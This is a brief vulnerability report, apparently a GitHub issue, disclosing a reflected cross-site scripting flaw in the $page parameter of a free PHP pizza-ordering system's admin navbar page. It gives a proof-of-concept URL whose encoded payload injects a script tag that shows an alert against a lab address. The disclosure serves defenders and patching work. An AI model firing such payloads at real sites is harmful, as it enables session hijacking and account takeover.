vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/16166/online-pizza-ordering-system-php-free-source-code.html

Vulnerability trigger parameter: $page

The process of vulnerability discovery is as follows：

![image](https://user-images.githubusercontent.com/30823782/220946894-b3b80dc1-29a9-4744-afcc-98ce11de51bf.png)


exp

```
http://192.168.31.50/php-opos/admin/navbar.php?page=%27%3E%3C/script%3E%3Cscript%3Ealert(%22xss%22)%3C/script%3E
```
![image](https://user-images.githubusercontent.com/30823782/220946941-6ef2b5a0-1734-4d72-b494-f6d0cc123bc9.png)

